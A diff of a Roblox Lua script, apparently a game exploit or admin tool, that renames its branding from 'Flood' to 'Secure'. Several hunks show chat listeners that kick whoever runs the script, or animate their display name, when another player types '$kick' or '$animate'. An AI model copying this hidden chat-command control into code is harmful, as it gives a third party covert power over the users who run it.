@@ -64,7 +64,7 @@ function premium()
 		v.Chatted:connect(function(cht)
 			if cht:match("$kick .") then
 				if game.Players.LocalPlayer ~= v then
-					game.Players.LocalPlayer:Kick("                                Kicked by Flood")
+					game.Players.LocalPlayer:Kick("                                Kicked by Secure")
 				end
 			end
 
@@ -282,45 +282,45 @@ function premium()
 			if cht:match("$animate") then
 				if game.Players.LocalPlayer ~= v then
 								while true do
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] F')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] S')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FL')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SE')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SEC')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECU')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECUR')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECURE')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOOO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECUREE')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOOOO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECUREEE')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOOOOO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECUREEEE')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOOOO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECUREEEEE')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOOO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECUREEEEEE')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOOO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECUREEEEEEE')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOOO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECUREEEEEEEE')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECUR')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLO')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] SECURE')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] BEST CODER')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] BEST LOCKER')
 								wait(1)
 					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] FLOODY$')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] s9Flood#7777')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] secure#0002')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] s9Flood#7777')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] secure#0002')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] s9Flood#7777')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] secure#0002')
 								wait(1)
 					end
 				end
@@ -352,7 +352,7 @@ local freeze = function()
 		v.Chatted:connect(function(cht)
 			if cht:match("$kick .") then
 				if game.Players.LocalPlayer ~= v then
-					game.Players.LocalPlayer:Kick("                                Kicked by Flood.")
+					game.Players.LocalPlayer:Kick("                                Kicked by Secure.")
 				end
 			end
 
@@ -575,7 +575,7 @@ local freeze = function()
 		v.Chatted:connect(function(cht)
 			if cht:match("$kick .") then
 				if game.Players.LocalPlayer ~= v then
-					game.Players.LocalPlayer:Kick("                                Kicked by Flood")
+					game.Players.LocalPlayer:Kick("                                Kicked by Secure")
 				end
 			end
 
